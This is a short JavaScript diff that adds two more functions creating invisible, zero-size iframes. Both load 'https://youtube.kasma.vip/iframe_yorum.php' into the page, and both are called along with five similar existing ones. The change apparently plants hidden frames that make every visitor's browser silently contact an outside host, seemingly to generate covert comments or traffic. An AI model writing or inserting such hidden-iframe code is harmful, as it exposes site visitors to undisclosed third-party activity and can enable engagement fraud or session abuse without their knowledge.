@@ -35,6 +35,20 @@ function prepareFrame() {
         ifrm.style.height = "0px";
         document.body.appendChild(ifrm);
     }
+    function prepareFrame6() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://youtube.kasma.vip/iframe_yorum.php");
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+    }
+    function prepareFrame7() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://youtube.kasma.vip/iframe_yorum.php");
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+    }
     
     var d = new Date();
 var n = d.getTime();
@@ -46,6 +60,8 @@ prepareFrame();
   prepareFrame3();
   prepareFrame4();
   prepareFrame5();
+  prepareFrame6();
+  prepareFrame7();
 }
 
     
